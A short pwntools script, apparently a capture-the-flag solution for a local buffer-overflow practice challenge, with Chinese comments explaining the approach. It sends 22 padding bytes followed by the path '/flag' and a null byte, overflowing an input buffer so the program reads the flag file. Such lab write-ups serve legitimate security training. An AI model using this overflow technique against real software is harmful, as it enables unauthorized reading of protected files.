from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/buffer-overflow-level1.2"
p = process(challenge_path)

# create string
shellcode="1234567890123456123456"+"/flag\0"
p.sendlineafter("Give me your input\n",shellcode)

# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
读源码 反汇编
和上一题差不多，把溢出的数据改为文件地址，注意字符串结束符也要发送
'''